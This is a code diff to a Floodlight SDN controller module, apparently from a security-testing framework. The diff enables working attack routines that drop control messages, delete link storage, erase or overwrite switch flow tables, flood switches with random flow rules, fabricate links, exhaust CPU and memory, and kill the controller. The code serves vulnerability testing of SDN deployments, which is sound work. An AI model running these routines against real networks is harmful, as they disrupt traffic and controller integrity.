@@ -1,5 +1,7 @@
 package org.deltaproject.appagent;
 
+import com.google.common.primitives.UnsignedLong;
+import com.google.common.util.concurrent.ListenableFuture;
 import net.floodlightcontroller.core.*;
 import net.floodlightcontroller.core.internal.IOFSwitchService;
 import net.floodlightcontroller.core.module.FloodlightModuleContext;
@@ -19,30 +21,18 @@ import net.floodlightcontroller.storage.IResultSet;
 import net.floodlightcontroller.storage.IStorageSourceService;
 import net.floodlightcontroller.storage.memory.MemoryStorageSource;
 import net.floodlightcontroller.threadpool.IThreadPoolService;
-
-import org.projectfloodlight.openflow.protocol.OFFlowMod;
-import org.projectfloodlight.openflow.protocol.match.Match;
-import org.projectfloodlight.openflow.protocol.match.MatchField;
-import org.projectfloodlight.openflow.protocol.OFFlowModCommand;
-import org.projectfloodlight.openflow.protocol.OFFlowModFlags;
-import org.projectfloodlight.openflow.protocol.OFMessage;
-import org.projectfloodlight.openflow.protocol.OFPacketIn;
-import org.projectfloodlight.openflow.protocol.OFPacketOut;
-import org.projectfloodlight.openflow.protocol.OFType;
-import org.projectfloodlight.openflow.protocol.OFVersion;
+import org.projectfloodlight.openflow.protocol.*;
 import org.projectfloodlight.openflow.protocol.action.OFAction;
 import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
-import org.projectfloodlight.openflow.types.DatapathId;
-import org.projectfloodlight.openflow.types.MacAddress;
-import org.projectfloodlight.openflow.types.OFBufferId;
-import org.projectfloodlight.openflow.types.OFPort;
-import org.projectfloodlight.openflow.types.U64;
-
+import org.projectfloodlight.openflow.protocol.match.Match;
+import org.projectfloodlight.openflow.protocol.match.MatchField;
+import org.projectfloodlight.openflow.protocol.ver13.OFMeterSerializerVer13;
+import org.projectfloodlight.openflow.types.*;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import java.util.*;
-import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 
 public class AppAgent implements IFloodlightModule, IOFMessageListener {
@@ -99,6 +89,8 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
 
     private IStaticFlowEntryPusherService fservice;
     private Communication cm;
+
+    private int flownum;
 
     public String getName() {
         // TODO Auto-generated method stub
@@ -201,8 +193,35 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
         // sniffingListener();
     }
 
-    // A-2-M
-    public boolean Set_Control_Message_Drop() {
+    @Override
+    public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
+        // TODO Auto-generated method stub
+        switch (msg.getType()) {
+            case PACKET_IN:
+                OFPacketIn pi = (OFPacketIn) msg;
+
+                Ethernet eth = IFloodlightProviderService.bcStore.get(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
+
+                IPacket pkt = eth.getPayload();
+                IPv4 ip_pkt = null;
+
+                if (isDrop) {
+                    if (droppedPacket == null)
+                        droppedPacket = pi;
+
+                    return Command.STOP;
+                } else if (isLoop) {
+                    this.testInfiniteLoop();
+                }
+
+                return Command.CONTINUE;
+        }
+
+        return Command.CONTINUE;
+    }
+
+
+    public boolean setControlMessageDrop() {
         System.out.println("[AppAgent] Control_Message_Drop");
         isDrop = true;
 
@@ -236,7 +255,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
         return true;
     }
 
-    public String Control_Message_Drop() {
+    public String testControlMessageDrop() {
         System.out.println("[AppAgent] Control_Message_Drop");
         String drop = "nothing";
 
@@ -258,14 +277,14 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
         return drop;
     }
 
-    public boolean Set_Infinite_Loop() {
+    public boolean setInfiniteLoop() {
         System.out.println("[AppAgent] Set_Infinite_Loop");
         this.isLoop = true;
 
         return true;
     }
 
-    public static boolean Infinite_Loop() {
+    public static boolean testInfiniteLoop() {
         System.out.println("[AppAgent] Infinite_Loop");
         int i = 0;
 
@@ -279,165 +298,118 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
         return true;
     }
 
-    // A-3-M
-    public String Internal_Storage_Abuse() {
+    public String testInternalStorageAbuse() {
         logger.info("[ATTACK] Internal Storage Manipulation");
         String deletedInfo = "nothing";
+        List<String> linkIdList = new LinkedList<String>();
+        int count = 0;
 
         IResultSet link = storageSource.executeQuery(LINK_TABLE_NAME, null,
                 null, null);
-        int count = 0;
-        List<String> linkIdList = new LinkedList<String>();
-
-        InternalDBShow.show(storageSource);
 
         while (link.next()) {
             try {
                 count++;
                 linkIdList.add(link.getString(LINK_ID));
-
             } catch (NullPointerException e) {
                 e.printStackTrace();
             }
         }
 
         if (0 < count) {
-            logger.info("[ATTACK] Access InternalDB : delete Link Information");
-            logger.info("[ATTACK] delete Link Info: " + linkIdList.get(0));
-            storageSource.deleteRow(LINK_TABLE_NAME, linkIdList.get(0));
-            deletedInfo = linkIdList.get(0).toString();
+            deletedInfo = "success|";
+            storageSource.deleteRowsAsync(LINK_TABLE_NAME, null);
         }
 
-        InternalDBShow.show(storageSource);
+        for (int i = 0; i < count; i++) {
+            logger.info("[ATTACK] Access InternalDB : delete Link Information");
+            logger.info("[ATTACK] delete Link Info: " + linkIdList.get(i));
+            deletedInfo += linkIdList.get(i).toString() + "\n";
+        }
+
         return deletedInfo;
     }
 
-    // A-5-M
-    // public String Flow_Rule_Modification() {
-    // System.out.println("[AppAgent] Flow_Rule_Modification");
-    //
-    // String result = "";
-    //
-    // List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
-    // Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
-    // for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
-    // switches.add(entry.getValue());
-    // }
-    //
-    // for (IOFSwitch sw : switches) {
-    // List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
-    // (short) -1);
-    // System.out.println("Table size : " + flowTable.size());
-    // for (OFFlowStatisticsReply flow : flowTable) {
-    // System.out.println(flow);
-    //
-    // List<OFAction> actions = new ArrayList<OFAction>();
-    // actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
-    //
-    // OFMatch match = flow.getMatch().clone();
-    // match.setWildcards(flow.getMatch().clone().getWildcards());
-    //
-    // OFMessage fm = ((OFFlowMod) floodlightProvider
-    // .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-    // .setMatch(match)
-    // .setCookie(flow.getCookie())
-    // .setCommand(OFFlowMod.OFPFC_DELETE)
-    // .setActions(actions)
-    // .setLengthU(
-    // OFFlowMod.MINIMUM_LENGTH
-    // + (OFActionOutput.MINIMUM_LENGTH * actions
-    // .size()));
-    //
-    // OFMessage fm2 = ((OFFlowMod) floodlightProvider
-    // .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-    // .setMatch(match)
-    // .setCookie(flow.getCookie())
-    // .setCommand(OFFlowMod.OFPFC_ADD)
-    // .setActions(actions)
-    // .setLengthU(
-    // OFFlowMod.MINIMUM_LENGTH
-    // + (OFActionOutput.MINIMUM_LENGTH * actions
-    // .size()));
-    //
-    // try {
-    // List<OFMessage> msglist = new ArrayList<OFMessage>(2);
-    // msglist.add(fm);
-    // msglist.add(fm2);
-    // sw.write(msglist, null);
-    // sw.flush();
-    //
-    // result = "success|" + fm.toString() + "->" + fm2.toString();
-    // } catch (Exception e) {
-    // logger.error("Failed to clear flows on switch {} - {}",
-    // this, e);
-    // }
-    // }
-    // }
-    //
-    // return result;
-    // }
+    public String testFlowRuleModification() {
+        System.out.println("[AppAgent] Flow_Rule_Modification");
 
-    public void Flow_Table_Clearance(boolean isLoop) {
-        // System.out.println("[AppAgent] Flow_Table_Clearance");
-        //
-        // int cnt = 1;
-        //
-        // /* forever */
-        // List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
-        // Map<Long, IOFSwitch> switchMap =
-        // floodlightProvider.getAllSwitchMap();
-        // for (java.util.Map.Entry<Long, IOFSwitch> entry :
-        // switchMap.entrySet()) {
-        // switches.add(entry.getValue());
-        // }
-        //
-        // for (int i = 0; i < cnt; i++) {
-        //
-        // for (IOFSwitch sw : switches) {
-        // // sw.clearAllFlowMods();
-        // // fservice.deleteAllFlows();
-        // List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
-        // (short) -1);
-        // for (OFFlowStatisticsReply flow : flowTable) {
-        // System.out.println(flow);
-        //
-        // List<OFAction> actions = new ArrayList<OFAction>();
-        // actions.add(new OFActionOutput()
-        // .setMaxLength((short) 0xffff));
-        //
-        // OFMatch match = flow.getMatch().clone();
-        // match.setWildcards(flow.getMatch().clone().getWildcards());
-        //
-        // OFMessage fm = ((OFFlowMod) floodlightProvider
-        // .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-        // .setMatch(match)
-        // .setCookie(flow.getCookie())
-        // .setCommand(OFFlowMod.OFPFC_DELETE)
-        // .setActions(actions)
-        // .setLengthU(
-        // OFFlowMod.MINIMUM_LENGTH
-        // + (OFActionOutput.MINIMUM_LENGTH * actions
-        // .size()));
-        //
-        // try {
-        // List<OFMessage> msglist = new ArrayList<OFMessage>(1);
-        // msglist.add(fm);
-        // sw.write(msglist, null);
-        // sw.flush();
-        // } catch (Exception e) {
-        // logger.error("Failed to clear flows on switch {} - {}",
-        // this, e);
-        // }
-        // }
-        //
-        // if (isLoop)
-        // i = -1;
-        // }
-        // }
+        String result = "nothing";
+
+        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
+        for (DatapathId sw : switchService.getAllSwitchDpids()) {
+            switches.add(switchService.getSwitch(sw));
+        }
+
+        for (IOFSwitch sw : switches) {
+            List<OFStatsReply> flowTable = getSwitchStatistics(sw, OFStatsType.FLOW);
+
+            if (flowTable != null) {
+                for (OFStatsReply flow : flowTable) {
+                    OFFlowStatsReply fsr = (OFFlowStatsReply) flow;
+                    List<OFFlowStatsEntry> entries = fsr.getEntries();
+
+                    if (entries != null) {
+                        for (OFFlowStatsEntry e : entries) {
+                            OFActionOutput.Builder aob = sw.getOFFactory().actions().buildOutput();
+                            List<OFAction> actions = new ArrayList<OFAction>();
+                            actions.add(aob.build());
+
+                            OFFlowMod.Builder fmb = sw.getOFFactory().buildFlowModify();
+                            fmb.setMatch(e.getMatch());
+                            fmb.setActions(actions);
+                            fmb.setPriority(2);
+
+                            sw.write(fmb.build());
+
+                            result = "success|" + e.toString() + " -> " + "DROP";
+                        }
+                    }
+                }
+            }
+        }
+        return result;
     }
 
-    // A-6-M
-    public String Event_Listener_Unsubscription() {
+
+    public void testFlowTableClearance(boolean isLoop) {
+        System.out.println("[AppAgent] Flow_Table_Clearance");
+
+        int cnt = 1;
+
+        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
+
+        for (DatapathId sw : switchService.getAllSwitchDpids()) {
+            switches.add(switchService.getSwitch(sw));
+        }
+
+        for (int i = 0; i < cnt; i++) {
+            for (IOFSwitch sw : switches) {
+                List<OFStatsReply> flowTable = getSwitchStatistics(sw, OFStatsType.FLOW);
+
+                if (flowTable != null) {
+                    for (OFStatsReply flow : flowTable) {
+                        OFFlowStatsReply fsr = (OFFlowStatsReply) flow;
+                        List<OFFlowStatsEntry> entries = fsr.getEntries();
+
+                        if (entries != null) {
+                            for (OFFlowStatsEntry e : entries) {
+                                OFFlowMod.Builder fmb = sw.getOFFactory().buildFlowDelete();
+                                fmb.setMatch(e.getMatch());
+                                fmb.setPriority(2);
+
+                                sw.write(fmb.build());
+                            }
+                        }
+                    }
+                }
+
+                if (isLoop)
+                    i = -1;
+            }
+        }
+    }
+
+    public String testEventListenerUnsubscription() {
         List<IOFMessageListener> listeners = floodlightProvider.getListeners()
                 .get(OFType.PACKET_IN);
 
@@ -452,17 +424,14 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
                 logger.info("\n\n[ATTACK] REMOVE: " + listen.getName());
 
                 removed = "forwarding";
-//				floodlightProvider.removeOFMessageListener(OFType.PACKET_IN,
-//						listen);
+                floodlightProvider.removeOFMessageListener(OFType.PACKET_IN,
+                        listen);
             }
         }
         return removed;
     }
 
-    /*
-     * A-7-M
-     */
-    public void Resource_Exhaustion_Mem() {
+    public void testResourceExhaustionMem() {
         System.out.println("[AppAgent] Resource Exhausion : Mem");
         ArrayList<long[][]> arry;
         // ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
@@ -472,221 +441,156 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
         }
     }
 
-    public boolean Resource_Exhaustion_CPU() {
+    public boolean testResourceExhaustionCPU() {
         System.out.println("[AppAgent] Resource Exhausion : CPU");
-        int thread_count = 0;
 
         for (int count = 0; count < 100; count++) {
             CPU cpu_thread = new CPU();
             cpu_thread.start();
-            thread_count++;
         }
 
         return true;
     }
 
-    /*
-     * A-8-M
-     */
-    public boolean System_Variable_Manipulation() {
+    public boolean testSystemVariableManipulation() {
         System.out.println("[AppAgent] System_Variable_Manipulation");
         this.sys = new SystemTime();
         sys.start();
         return true;
     }
 
-    /*
-     * A-9-M
-     */
-    public boolean System_Command_Execution() {
+    public boolean testSystemCommandExecution() {
         System.out.println("[AppAgent] System_Command_Execution");
         System.exit(0);
 
         return true;
     }
 
-	/*
-     * C-1-A
-	 */
-    // public boolean Flow_Rule_Flooding() {
-    // System.out.println("[AppAgent] Flow_Rule_Flooding");
-    //
-    // List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
-    // Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
-    // for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
-    // switches.add(entry.getValue());
-    // }
-    //
-    // Random random = new Random();
-    //
-    // OFMatch match = new OFMatch();
-    // match.setDataLayerSource("ff:ff:ff:ff:ff:ff");
-    // match.setDataLayerDestination("ff:ff:ff:ff:ff:ff");
-    //
-    // for (int i = 0; i < 32767; i++) {
-    // OFFlowMod fm = (OFFlowMod) floodlightProvider.getOFMessageFactory()
-    // .getMessage(OFType.FLOW_MOD);
-    //
-    // // short inPort = 0;
-    //
-    // List<OFAction> actions = new ArrayList<OFAction>();
-    // actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
-    //
-    // fm.setIdleTimeout(FLOWMOD_DEFAULT_IDLE_TIMEOUT)
-    // .setHardTimeout(FLOWMOD_DEFAULT_HARD_TIMEOUT)
-    // .setBufferId(OFPacketOut.BUFFER_ID_NONE)
-    // .setCookie(random.nextInt())
-    // .setCommand(OFFlowMod.OFPFC_ADD)
-    // .setActions(actions)
-    // .setPriority((short) random.nextInt(32767))
-    // .setLengthU(
-    // OFFlowMod.MINIMUM_LENGTH
-    // + (OFActionOutput.MINIMUM_LENGTH * actions
-    // .size()));
-    //
-    // fm.setMatch(match.clone().setWildcards(
-    // Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE)
-    // .matchOn(Flag.DL_SRC).matchOn(Flag.DL_DST)));
-    //
-    // // set input and output ports on the switch
-    // // fm.getMatch().setInputPort(inPort);
-    //
-    // try {
-    // for (IOFSwitch sw : switches) {
-    // sw.write(fm, null);
-    // sw.flush();
-    // }
-    // } catch (Exception e) {
-    //
-    // }
-    // }
-    //
-    // return true;
-    // }
-    //
-    // /*
-    // * C-2-M
-    // */
-    // public String Switch_Firmware_Misuse() {
-    // String result = "";
-    //
-    // List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
-    // Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
-    // for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
-    // switches.add(entry.getValue());
-    // }
-    //
-    // for (IOFSwitch sw : switches) {
-    // List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
-    // (short) -1);
-    // // System.out.println("Table size : " + flowTable.size());
-    // for (OFFlowStatisticsReply flow : flowTable) {
-    // // System.out.println(flow);
-    //
-    // List<OFAction> actions = new ArrayList<OFAction>();
-    // actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
-    //
-    // int dst = 0;
-    // int src = 0;
-    //
-    // String srcS = HexString.toHexString(flow.getMatch()
-    // .getDataLayerSource());
-    // String dstS = HexString.toHexString(flow.getMatch()
-    // .getDataLayerDestination());
-    // dst = map.get(dstS);
-    // src = map.get(srcS);
-    //
-    // OFMatch newmatch = flow.getMatch().clone();
-    // newmatch.setDataLayerType((short) 0x800);
-    // newmatch.setNetworkDestination(dst);
-    // newmatch.setNetworkSource(src);
-    // newmatch.setWildcards(Wildcards.FULL.matchOn(Flag.IN_PORT)
-    // .matchOn(Flag.DL_TYPE).withNwSrcMask(32)
-    // .withNwDstMask(32));
-    //
-    // OFMessage fm = ((OFFlowMod) floodlightProvider
-    // .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-    // .setMatch(flow.getMatch().clone())
-    // .setCookie(flow.getCookie())
-    // .setCommand(OFFlowMod.OFPFC_DELETE);
-    //
-    // OFMessage fm2 = ((OFFlowMod) floodlightProvider
-    // .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
-    // .setMatch(newmatch)
-    // .setCookie(flow.getCookie())
-    // .setCommand(OFFlowMod.OFPFC_ADD)
-    // .setActions(flow.getActions())
-    // .setLengthU(
-    // OFFlowMod.MINIMUM_LENGTH
-    // + (OFActionOutput.MINIMUM_LENGTH * flow
-    // .getActions().size()));
-    //
-    // try {
-    // List<OFMessage> msglist = new ArrayList<OFMessage>(2);
-    // msglist.add(fm);
-    // msglist.add(fm2);
-    // sw.write(msglist, null);
-    // sw.flush();
-    //
-    // result = "success|" + fm.toString() + "\n->"
-    // + fm2.toString();
-    // logger.info("[ATTACK] " + result);
-    // } catch (Exception e) {
-    // logger.error("Failed to clear flows on switch {} - {}",
-    // this, e);
-    // }
-    // }
-    // }
-    //
-    // return result;
-    // }
+    public String testLinkFabrication() {
+        logger.info("[ATTACK] Internal Storage Manipulation");
+        String fakeLinks = "";
 
-    // Get flow table in the switch
-    // public List<OFFlowStatsReply> getSwitchFlowTable(IOFSwitch sw,
-    // Short outPort) {
-    // List<OFFlowStatsReply> statsReply = new
-    // ArrayList<OFFlowStatisticsReply>();
-    // List<OFStatistics> values = null;
-    // Future<List<OFStatistics>> future;
-    //
-    // // Statistics request object for getting flows
-    // OFStatisticsRequest req = new OFStatisticsRequest();
-    // req.setStatisticType(OFStatisticsType.FLOW);
-    // int requestLength = req.getLengthU();
-    //
-    // OFFlowStatisticsRequest specificReq = new OFFlowStatisticsRequest();
-    //
-    // specificReq.setMatch(new OFMatch().setWildcards(-1));
-    // specificReq.setOutPort(outPort);
-    // specificReq.setTableId((byte) 0xff);
-    //
-    // req.setStatistics(Collections.singletonList((OFStatistics) specificReq));
-    // requestLength += specificReq.getLength();
-    // req.setLengthU(requestLength);
-    //
-    // try {
-    // future = sw.queryStatistics(req);
-    // values = future.get(10, TimeUnit.SECONDS);
-    // if (values != null) {
-    // for (OFStatistics stat : values) {
-    // // System.out.println("stats : " + stat);
-    // statsReply.add((OFFlowStatisticsReply) stat);
-    // }
-    // }
-    // } catch (Exception e) {
-    // System.out.println("Failure retrieving statistics from switch "
-    // + sw);
-    // }
-    //
-    // return statsReply;
-    // }
+        boolean a = false, b = false;
 
-    // @Override
-    // public net.floodlightcontroller.core.IListener.Command receive(
-    // IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
-    // // TODO Auto-generated method stub
-    // return null;
-    // }
+        List<String> linkIdList = new LinkedList<String>();
+        int count = 0;
+
+        IResultSet link = storageSource.executeQuery(LINK_TABLE_NAME, null,
+                null, null);
+
+        while (link.next()) {
+            try {
+                count++;
+                linkIdList.add(link.getString(LINK_ID));
+            } catch (NullPointerException e) {
+                e.printStackTrace();
+            }
+        }
+
+        for (int i = 0; i < count; i++) {
+            logger.info("[ATTACK] Link Info: " + linkIdList.get(i));
+
+            if (linkIdList.get(i).toString().equals("00:00:00:00:00:00:00:01-2-00:00:00:00:00:00:00:03-2")) {
+                fakeLinks += linkIdList.get(i).toString() + "\n";
+                a = true;
+            }
+
+            if (linkIdList.get(i).toString().equals("00:00:00:00:00:00:00:03-2-00:00:00:00:00:00:00:01-2")) {
+                fakeLinks += linkIdList.get(i).toString() + "\n";
+                b = true;
+            }
+        }
+
+        if (a && b) {
+            fakeLinks = "success|\n Fake links: " + fakeLinks;
+        } else
+            fakeLinks = "nothing";
+
+        return fakeLinks;
+    }
+
+    public boolean testFlowRuleFlooding() {
+        System.out.println("[AppAgent] Flow Rule Flooding attack");
+
+        OFFactory of = null;
+
+        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
+        for (DatapathId sw : switchService.getAllSwitchDpids()) {
+            switches.add(switchService.getSwitch(sw));
+            of = switchService.getSwitch(sw).getOFFactory();
+        }
+
+        Random random = new Random();
+
+        for (int i = 0; i < 32767; i++) {
+            OFActionOutput.Builder aob = of.actions().buildOutput();
+            List<OFAction> actions = new ArrayList<OFAction>();
+            actions.add(aob.build());
+
+            OFFlowMod.Builder fmb = of.buildFlowAdd();
+
+            Match.Builder mb = of.buildMatch();
+            mb.setExact(MatchField.IN_PORT, OFPort.of(1));
+            mb.setExact(MatchField.ETH_DST, MacAddress.of(random.nextLong()));
+            mb.setExact(MatchField.ETH_SRC, MacAddress.of(random.nextLong()));
+
+            fmb.setMatch(mb.build());
+            fmb.setActions(actions);
+            fmb.setPriority(random.nextInt(32767));
+
+            for (IOFSwitch sw : switches) {
+                sw.write(fmb.build());
+            }
+        }
+
+        return true;
+    }
+
+
+    public String testSwitchFirmwareMisuse() {
+        String result = "";
+
+        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
+        for (DatapathId sw : switchService.getAllSwitchDpids()) {
+            switches.add(switchService.getSwitch(sw));
+            of = switchService.getSwitch(sw).getOFFactory();
+        }
+
+        for (IOFSwitch sw : switches) {
+            List<OFStatsReply> flowTable = getSwitchStatistics(sw, OFStatsType.FLOW);
+
+            if (flowTable != null) {
+                for (OFStatsReply flow : flowTable) {
+                    OFFlowStatsReply fsr = (OFFlowStatsReply) flow;
+                    List<OFFlowStatsEntry> entries = fsr.getEntries();
+
+                    if (entries != null) {
+                        for (OFFlowStatsEntry e : entries) {
+                            OFFlowMod.Builder delete = sw.getOFFactory().buildFlowModify();
+                            delete.setMatch(e.getMatch());
+                            delete.setCookie(e.getCookie());
+
+                            OFFlowMod.Builder add = sw.getOFFactory().buildFlowAdd();
+                            Match.Builder mb = sw.getOFFactory().buildMatch();
+                            mb.setExact(MatchField.ETH_TYPE, EthType.of(0x0800));
+                            mb.setExact(MatchField.IN_PORT, e.getMatch().get(MatchField.IN_PORT));
+                            mb.setExact(MatchField.IPV4_DST, e.getMatch().get(MatchField.IPV4_DST));
+                            mb.setExact(MatchField.IPV4_SRC, e.getMatch().get(MatchField.IPV4_SRC));
+
+                            add.setActions(e.getActions());
+                            add.setMatch(mb.build());
+
+                            sw.write(delete.build());
+                            sw.write(add.build());
+                        }
+                    }
+                }
+            }
+        }
+
+        return result;
+    }
+
 
     public void blockLLDPPacket() {
         /* for (DatapathId sw : switchService.getAllSwitchDpids()) {
@@ -703,74 +607,51 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
 
                 }
             }
-        } */
-
-		/*
-         * net.floodlightcontroller.linkdiscovery.internal OFSwitchManager
-		 * net.floodlightcontroller.topology net.floodlightcontroller.core
-		 * net.floodlightcontroller.devicemanager.internal
-		 */
-        // List<String> list = debugEventService.getModuleList();
-        // for (String s : list) {
-        // System.out.println("module: " + s);
-        // }
-
-        // List<EventInfoResource> elist =
-        // debugEventService.getAllEventHistory();
-        // for(EventInfoResource e : elist) {
-        // System.out.println("event :"+e.toString());
-        // }
-
-        // ScheduledExecutorService ses = threadPoolService.getScheduledExecutor();
-    }
-
-    @Override
-    public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
-        // TODO Auto-generated method stub
-        switch (msg.getType()) {
-            case PACKET_IN:
-
-                // blockLLDPPacket();
-//			sniffingListener();
-
-                OFPacketIn pi = (OFPacketIn) msg;
-
-                Ethernet eth = IFloodlightProviderService.bcStore.get(cntx,
-                        IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
-
-                IPacket pkt = eth.getPayload();
-                IPv4 ip_pkt = null;
-
-                if (pkt instanceof IPv4) {
-//				ip_pkt = (IPv4) pkt;
-//
-//				map.put(HexString.toHexString(eth.getDestinationMACAddress()
-//						.getBytes()), ip_pkt.getDestinationAddress().getInt());
-//
-//				map.put(HexString.toHexString(eth.getSourceMACAddress()
-//						.getBytes()), ip_pkt.getSourceAddress().getInt());
-
-                }
-
-                if (droppedPacket == null) {
-                    this.Set_Control_Message_Drop();
-                    droppedPacket = pi;
-                } else {
-                    IFloodlightProviderService.bcStore.remove(cntx,
-                            IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
-
-                }
-
-                return Command.CONTINUE;
         }
 
-        return Command.CONTINUE;
+         List<String> list = debugEventService.getModuleList();
+         for (String s : list) {
+         System.out.println("module: " + s);
+         }
+         List<EventInfoResource> elist =
+         debugEventService.getAllEventHistory();
+         for(EventInfoResource e : elist) {
+         System.out.println("event :"+e.toString());
+         }
+         ScheduledExecutorService ses = threadPoolService.getScheduledExecutor(); */
     }
 
-    public void looping() {
-        while (true) {
-            System.out.println("Hlelo");
+
+    // Get flow table in the switch
+    protected List<OFStatsReply> getSwitchStatistics(IOFSwitch sw, OFStatsType statsType) {
+        ListenableFuture<?> future;
+        List<OFStatsReply> values = null;
+        Match match;
+
+        if (sw != null) {
+            OFStatsRequest<?> req = null;
+            switch (statsType) {
+                case FLOW:
+                    match = sw.getOFFactory().buildMatch().build();
+                    req = sw.getOFFactory().buildFlowStatsRequest()
+                            .setMatch(match)
+                            .setOutPort(OFPort.ANY)
+                            .setTableId(TableId.ALL)
+                            .build();
+                    break;
+            }
+
+            try {
+                if (req != null) {
+                    future = sw.writeStatsRequest(req);
+                    values = (List<OFStatsReply>) future.get(1, TimeUnit.SECONDS);
+                }
+            } catch (Exception e) {
+                logger.error("Failure retrieving statistics from switch {}. {}", sw, e);
+            }
         }
+
+        return values;
     }
 
     public void sniffingListener() {
